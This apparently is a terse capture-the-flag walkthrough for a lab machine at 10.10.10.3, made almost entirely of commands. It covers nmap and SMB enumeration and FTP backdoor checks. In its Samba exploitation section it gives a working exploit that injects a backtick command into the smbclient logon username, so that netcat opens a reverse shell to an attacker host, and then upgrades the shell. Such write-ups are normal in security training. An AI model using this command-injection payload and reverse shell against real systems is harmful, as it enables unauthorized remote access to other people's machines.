#   CMD 

```
nmap -sC -sV 10.10.10.3
```
-sC: run default nmap scripts <br>
-sV: detect service version

```
ls /usr/share/nmap/scripts/ftp*
```
/usr/share/nmap/scripts/ftp-anon.nse<br>
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse<br>
/usr/share/nmap/scripts/ftp-bounce.nse <br>
/usr/share/nmap/scripts/ftp-syst.nse<br>
/usr/share/nmap/scripts/ftp-brute.nse
/usr/share/nmap/scripts/ftp-libopie.nse <br>
/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
<h5>/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse</h5>

```
nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
```
```
ls /usr/share/nmap/scripts/ssh*
```
```
smbclient -L 10.10.10.3
```
```
smbmap -H 10.10.10.3
```

#   Exploitation #1: Samba

```
nc -nlvp 4444
```
```
smbclient //10.10.10.3/tmp
```
```
logon "/=`nohup nc -nv 10.10.14.6 4444 -e /bin/sh`"
```
```
python3 -c 'import pty;pty.spawn("/bin/bash")' 
```
